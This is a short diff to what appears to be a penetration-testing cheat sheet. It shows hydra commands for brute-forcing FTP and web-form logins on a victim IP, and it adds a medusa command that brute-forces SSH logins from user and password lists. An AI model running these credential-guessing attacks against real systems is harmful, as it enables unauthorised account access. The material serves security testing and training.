@@ -106,4 +106,11 @@ hydra -l user -P <wordlist>.txt ftp://<ip_victim>
 hydra -l <username> -P <wordlist> <ip_victim> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
 
-###
+## `MEDUSA`
+
+### Bruteforce SSH
+
+```bash
+medusa -h IP -U users.txt -P passwords.txt -M ssh IP
+```
+
